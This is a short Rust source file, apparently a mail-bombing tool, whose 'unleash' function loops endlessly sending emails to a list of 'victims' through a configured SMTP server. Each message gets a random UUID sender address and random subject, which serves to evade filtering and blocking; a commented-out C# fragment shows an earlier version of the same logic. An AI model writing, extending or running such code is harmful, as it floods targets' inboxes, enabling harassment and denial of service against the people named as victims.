extern crate uuid;
//extern crate tokio;
//extern crate new_tokio_smtp;
mod email;
mod config;

use std::time::Duration;
use std::thread::sleep;
use std::path::PathBuf;

use uuid::Uuid;

use crate::email::{SmtpServer, Email};

pub fn unleash(victims: Vec<String>) {
    /*
                string fromHash = getHash(string.Format("{0} {1} {2}", ConfigurationManager.AppSettings["FromAddress"], DateTime.Now.ToLongDateString(), DateTime.Now.ToLongTimeString()));
                string from = string.Format("{0}@{1}", fromHash, domain);
                string subject = getHash(string.Format("{0} {1}", DateTime.Now.ToLongDateString(), DateTime.Now.ToLongTimeString()));

                sendMail(mailHost, addresses, from, subject, body);
    */
    loop {
        let config = config::read_config_file(PathBuf::from("config.toml")).unwrap();
        
        let from_address = format!("{}@{}", Uuid::new_v4().to_simple().to_string(), config.domain);
        let subject = format!("{}", Uuid::new_v4().to_simple().to_string());



        let smtp_server = SmtpServer {
            mail_host: config.mail_host,
            port: config.port,
            username: config.username,
            password: config.password,
            supports_ssl: config.supports_ssl
        };

        smtp_server.send(Email{
            from: from_address,
            to: victims.clone(),
            subject: subject,
            body: config.message
        });

        sleep(Duration::new(config.delay_seconds, 0)); // a minute's rest
    }
}
